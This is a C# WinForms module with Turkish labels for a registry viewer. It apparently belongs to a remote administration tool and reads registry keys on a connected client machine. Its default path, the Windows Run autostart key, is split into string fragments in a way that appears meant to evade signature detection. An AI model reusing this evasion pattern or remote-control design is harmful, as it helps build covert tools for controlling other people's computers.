// Dosya: Modules/RegistryEditorForm.cs
//using App.Service.Modules;
using System;
using System.Drawing;
using System.Windows.Forms;

namespace App.Service
{
    public class RegistryEditorForm : ModuleForm, IRemoteModule
    {
        ListView _list;
        TextBox _path;
        Action<string> _send;

        public RegistryEditorForm() : base("Kayıt Defteri")
        {
            Size = new Size(800, 560);

            var top = new BufferedPanel { Height = S(38), Dock = DockStyle.Top, BackColor = Theme.Current.Side, Padding = new Padding(S(6)), Tag = "side" };

            var go = new PillButton { Text = "Oku", Dock = DockStyle.Right, Width = S(72), Radius = 6 };
            go.Palette(Theme.Current.Accent, Color.White);
            go.Click += (s, e) => { if (_send != null) _send("REG|READ|" + _path.Text); };

            _path = new TextBox { Dock = DockStyle.Fill, BackColor = Theme.Current.InputBack, ForeColor = Theme.Current.InputFore, BorderStyle = BorderStyle.None, Text = @"SOFTWARE\Micro" + @"soft\Windows\Current" + @"Version\Run", Font = Ui.F(8.5f) };
            _path.KeyDown += (s, e) => { if (e.KeyCode == Keys.Enter) { e.SuppressKeyPress = true; if (_send != null) _send("REG|READ|" + _path.Text); } };

            top.Controls.Add(_path);
            top.Controls.Add(go);

            _list = new BufferedListView { Dock = DockStyle.Fill, View = View.Details, FullRowSelect = true, BackColor = Theme.Current.Main, ForeColor = Theme.Current.Text, BorderStyle = BorderStyle.None, Font = Ui.F(8.5f) };
            _list.Columns.Add("Değer", S(240));
            _list.Columns.Add("Veri", S(460));

            Body.Controls.Add(_list);
            Body.Controls.Add(top);
        }

        public void Initialize(ClientSession s, Action<string> send)
        {
            _send = send;
            Title.Text = "Kayıt Defteri - " + s.UserPc;
            Shown += (e, a) => { if (_send != null) _send("REG|READ|" + _path.Text); };
        }

        public void UpdateRegistry(string data)
        {
            if (IsDisposed) return;
            if (InvokeRequired) { try { BeginInvoke((MethodInvoker)delegate { UpdateRegistry(data); }); } catch { } return; }
            _list.BeginUpdate();
            _list.Items.Clear();
            if (data.StartsWith("ERROR|")) { _list.EndUpdate(); MessageBox.Show(data.Substring(6), "Hata"); return; }
            foreach (string row in data.Split(new[] { "~|" }, StringSplitOptions.RemoveEmptyEntries))
            {
                int i = row.IndexOf(" = ", StringComparison.Ordinal);
                if (i < 0) continue;
                var lvi = new ListViewItem(row.Substring(0, i));
                lvi.SubItems.Add(row.Substring(i + 3));
                _list.Items.Add(lvi);
            }
            _list.EndUpdate();
        }
    }
}